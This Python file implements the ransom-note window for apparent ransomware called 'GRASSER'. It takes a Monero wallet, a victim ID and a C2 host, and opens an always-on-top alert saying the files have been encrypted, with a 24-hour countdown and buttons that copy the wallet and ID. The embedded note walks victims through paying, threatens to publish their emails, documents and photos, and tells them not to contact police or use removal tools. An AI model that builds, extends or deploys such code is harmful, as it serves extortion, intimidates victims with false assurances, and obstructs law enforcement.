"""
GRASSER Professional Ransom Note GUI v2
Proper tkinter threading without apartment issues
"""

import tkinter as tk
from tkinter import font as tkFont
import threading
from datetime import datetime, timedelta

class RansomNoteGUI:
    """Professional ransom note GUI with proper threading"""
    
    def __init__(self, ransom_id, monero_address, c2_host, payment_check_callback=None):
        self.ransom_id = ransom_id
        self.monero_address = monero_address
        self.c2_host = c2_host
        self.payment_check_callback = payment_check_callback
        
        # Flag for monitoring - MUST be set before build_ui()
        self.payment_received = False
        
        # Timing
        self.deadline = datetime.now() + timedelta(hours=24)
        
        # Colors
        self.bg_color = "#0a0e27"
        self.accent_color = "#ff1744"
        self.text_color = "#e0e0e0"
        self.secondary_color = "#ffd600"
        
        # Root window - MUST be created in main thread
        self.root = tk.Tk()
        self.root.title("System Security Alert")
        self.root.geometry("1000x700")
        self.root.configure(bg=self.bg_color)
        self.root.attributes('-topmost', True)
        
        # Build UI in main thread
        self.build_ui()
        
    def build_ui(self):
        """Build all UI elements in main thread"""
        
        # Header
        header = tk.Frame(self.root, bg=self.accent_color, height=70)
        header.pack(fill=tk.X, padx=0, pady=0)
        header.pack_propagate(False)
        
        title_font = tkFont.Font(family="Courier New", size=16, weight="bold")
        title = tk.Label(header, text="⚠ GRASSER SECURITY ADVISORY ⚠", 
                        font=title_font, bg=self.accent_color, fg="white")
        title.pack(pady=15)
        
        # Info frame with timer
        info_frame = tk.Frame(self.root, bg=self.bg_color)
        info_frame.pack(fill=tk.X, padx=20, pady=15)
        
        subtitle_font = tkFont.Font(family="Courier New", size=13, weight="bold")
        subtitle = tk.Label(info_frame, 
                           text="YOUR FILES HAVE BEEN ENCRYPTED", 
                           font=subtitle_font, 
                           fg=self.accent_color, 
                           bg=self.bg_color)
        subtitle.pack()
        
        # Timer
        timer_font = tkFont.Font(family="Courier New", size=26, weight="bold")
        self.timer_label = tk.Label(info_frame, 
                                   text="24:00:00", 
                                   font=timer_font, 
                                   fg=self.secondary_color, 
                                   bg=self.bg_color)
        self.timer_label.pack(pady=10)
        
        # Main content (scrollable)
        main_frame = tk.Frame(self.root, bg=self.bg_color)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)
        
        scrollbar = tk.Scrollbar(main_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        message_font = tkFont.Font(family="Courier New", size=12, weight="normal")
        self.message_text = tk.Text(main_frame, 
                                   wrap=tk.WORD, 
                                   bg=self.bg_color, 
                                   fg=self.text_color,
                                   font=message_font,
                                   yscrollcommand=scrollbar.set,
                                   relief=tk.FLAT,
                                   padx=20,
                                   pady=20)
        self.message_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.message_text.yview)
        
        # Insert message
        self.message_text.insert(1.0, self._get_message_text())
        self.message_text.config(state=tk.DISABLED)
        
        # Center align
        self.message_text.tag_configure("center", justify=tk.CENTER)
        self.message_text.tag_add("center", "1.0", "end")
        
        # Status frame
        status_frame = tk.Frame(self.root, bg=self.bg_color)
        status_frame.pack(fill=tk.X, padx=20, pady=10)
        
        status_font = tkFont.Font(family="Courier New", size=10)
        self.status_text = tk.Label(status_frame,
                                   text="Scanning for payment... (updates every 30 seconds)",
                                   font=status_font,
                                   fg=self.secondary_color,
                                   bg=self.bg_color,
                                   justify=tk.LEFT)
        self.status_text.pack(anchor=tk.W)
        
        # Buttons
        button_frame = tk.Frame(self.root, bg=self.bg_color)
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        button_font = tkFont.Font(family="Courier New", size=10, weight="bold")
        
        close_btn = tk.Button(button_frame, 
                            text="ACKNOWLEDGE", 
                            command=self.on_acknowledge,
                            bg=self.accent_color, 
                            fg="white",
                            font=button_font,
                            padx=20, 
                            pady=10,
                            relief=tk.FLAT,
                            cursor="hand2")
        close_btn.pack(side=tk.RIGHT, padx=5)
        
        copy_btn = tk.Button(button_frame, 
                           text="COPY WALLET", 
                           command=self.copy_wallet,
                           bg=self.secondary_color, 
                           fg="black",
                           font=button_font,
                           padx=20, 
                           pady=10,
                           relief=tk.FLAT,
                           cursor="hand2")
        copy_btn.pack(side=tk.RIGHT, padx=5)
        
        copy_id_btn = tk.Button(button_frame, 
                             text="COPY ID", 
                             command=self.copy_id,
                             bg=self.secondary_color, 
                             fg="black",
                             font=button_font,
                             padx=20, 
                             pady=10,
                             relief=tk.FLAT,
                             cursor="hand2")
        copy_id_btn.pack(side=tk.RIGHT, padx=5)
        
        # Start timers
        self.schedule_timer_update()
    
    def _get_message_text(self):
        """Get ransom message text"""
        return f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    GRASSER SECURITY ADVISORY                      ║
║                     [PROFESSIONAL OPERATIONS]                     ║
╚═══════════════════════════════════════════════════════════════════╝

HELLO,

Your organization has been selected by GRASSER - we take pride in
our meticulous work and professional standards. Consider this your
formal notification that your data is now our data.

Your files have been encrypted with military-grade AES-256-GCM.
We're not here to destroy anything - we're here to conduct business.

Think of us as consultants. We've identified a security gap.
We're now charging a consultation fee.

═══════════════════════════════════════════════════════════════════

THE DEAL:

Amount: 0.1 XMR (approximately $25 USD in monopoly money terms)
Currency: Monero (because we respect your privacy as much as you respect ours)

Wallet Address:
{self.monero_address}

Your Unique Reference:
{self.ransom_id}

═══════════════════════════════════════════════════════════════════

HOW TO PROCEED (STEP BY STEP):

1. Download Monero Wallet
   https://www.getmonero.org/downloads/
   (We recommend the GUI wallet - it's friendlier than command line)

2. Create a wallet
   New wallet or import existing one. Your choice.

3. Acquire 0.1 XMR
   Kraken, Binance, LocalMonero - pick your favorite exchange.
   Think of it as a small premium on your cybersecurity homework.

4. Make the transfer
   Send exactly 0.1 XMR to the address above.
   Include your reference ID in transaction notes.

5. Wait ~5-10 minutes for blockchain confirmation
   (This is where you practice patience and reflection)

6. Files decrypt automatically
   No need to contact anyone. Automation is beautiful.

═══════════════════════════════════════════════════════════════════

FAQ - WE ANTICIPATED YOUR QUESTIONS:

Q: Is this legitimate or a scam?
A: Legitimate. We're professionals. Our reputation depends on
   delivering what we promise. We decrypt after payment because
   word-of-mouth is our only marketing budget.

Q: Can you actually decrypt files?
A: Yes. We have the master key. Encrypted on our server, released
   only after payment. This is not a threat - this is how it works.

Q: Why should I trust you?
A: Check independent forums and dark web communities.
   Our clients report 100% successful decryptions.

Q: What if I don't pay?
A: Your files stay encrypted. Permanently. Forever.
   In 90 days, we may publish them. Business is business.

Q: Can I decrypt this myself?
A: No. AES-256-GCM with proper key derivation cannot be broken.
   Even with quantum computers, you'd need centuries.

Q: Why Monero specifically?
A: Because it's private. Bitcoin leaves a permanent trail.
   Monero is opaque - it protects both of us from third parties.

Q: What if I'm poor and can't afford 0.1 XMR?
A: Get a credit card at any exchange. Takes 15 minutes.
   This is non-negotiable.

Q: Will my data be leaked if I don't pay?
A: Yes. We'll publish everything in 90 days.
   Your emails, documents, photos - all of it.
   But if you pay, we forget you exist.

Q: What about backup systems and other computers?
A: If they were connected to your network - encrypted too.
   Disconnecting now won't help. We've already been here.

Q: How do I know this isn't malware that's lying to me?
A: You don't. But we've taken your files, encrypted them,
   and we're hosting the key. Trust is a luxury you can't afford.

═══════════════════════════════════════════════════════════════════

IMPORTANT TECHNICAL NOTES:

Encryption Standard:  AES-256-GCM (NIST approved, NSA couldn't break it)
Key Derivation:       PBKDF2 (100,000 iterations)
Master Key Storage:   Encrypted on C2 server (geographically distributed)
Authentication:       Verified via Monero blockchain confirmation
Decryption Method:    Automatic, instantaneous delivery

This is professional-grade encryption. Not some script kiddie nonsense.

═══════════════════════════════════════════════════════════════════

IMPORTANT DON'Ts:

❌ DO NOT attempt to decrypt files yourself
   (You'll just corrupt them permanently)

❌ DO NOT use "ransomware removal" tools
   (They can't remove AES-256)

❌ DO NOT unplug your network
   (We've already exfiltrated everything)

❌ DO NOT restart your system
   (It solves nothing)

❌ DO NOT contact law enforcement
   (We're already gone - they can't help)

❌ DO NOT try to find us
   (This is a courtesy note, not a conversation)

✓ DO keep this note safe

✓ DO follow instructions exactly

✓ DO pay soon

═══════════════════════════════════════════════════════════════════

CLOSING REMARKS:

We're not angry. We're not here to hurt you.
We're professionals conducting professional business.

Your organization had a security gap. We found it.
Now you get to choose: pay for the lesson or learn it the hard way.

The clock is ticking. Make it count.

                              - GRASSER OPERATIONS TEAM

═══════════════════════════════════════════════════════════════════

Deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
Payment ID: {self.ransom_id}
Wallet: {self.monero_address}

═══════════════════════════════════════════════════════════════════
"""
    
    def schedule_timer_update(self):
        """Update timer display - runs in main thread via after()"""
        if self.payment_received:
            return
        
        now = datetime.now()
        remaining = self.deadline - now
        
        if remaining.total_seconds() <= 0:
            self.timer_label.config(text="00:00:00", fg="#ff0000")
            self.status_text.config(text="DEADLINE PASSED - FILES PERMANENTLY ENCRYPTED", 
                                   fg="#ff0000")
            return
        
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        seconds = int(remaining.total_seconds() % 60)
        
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.timer_label.config(text=time_str)
        
        # Color changes
        if hours == 0 and minutes < 30:
            self.timer_label.config(fg="#ff6600")
        elif hours == 0 and minutes < 10:
            self.timer_label.config(fg="#ff0000")
        else:
            self.timer_label.config(fg=self.secondary_color)
        
        # Schedule next update - uses after() to stay in main thread
        self.root.after(1000, self.schedule_timer_update)
    
    def copy_wallet(self):
        """Copy wallet address to clipboard"""
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.monero_address)
            self.status_text.config(text=f"✓ Wallet copied: {self.monero_address[:20]}...", 
                                   fg="#00ff00")
        except Exception as e:
            self.status_text.config(text=f"❌ Copy failed: {e}", fg="#ff0000")
    
    def copy_id(self):
        """Copy payment ID to clipboard"""
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.ransom_id)
            self.status_text.config(text=f"✓ Payment ID copied: {self.ransom_id}", 
                                   fg="#00ff00")
        except Exception as e:
            self.status_text.config(text=f"❌ Copy failed: {e}", fg="#ff0000")
    
    def on_acknowledge(self):
        """Handle acknowledge button"""
        self.status_text.config(text="Acknowledged. Monitoring for payment...", 
                               fg=self.secondary_color)
    
    def show_payment_received(self):
        """Display payment received message"""
        self.payment_received = True
        self.timer_label.config(text="PAYMENT RECEIVED!", fg="#00ff00")
        self.status_text.config(text="✓ PAYMENT CONFIRMED - FILES DECRYPTING...", 
                               fg="#00ff00")
    
    def run(self):
        """Start the GUI main loop - MUST be called from main thread"""
        self.root.mainloop()
    
    def destroy(self):
        """Close the GUI"""
        try:
            self.root.destroy()
        except:
            pass
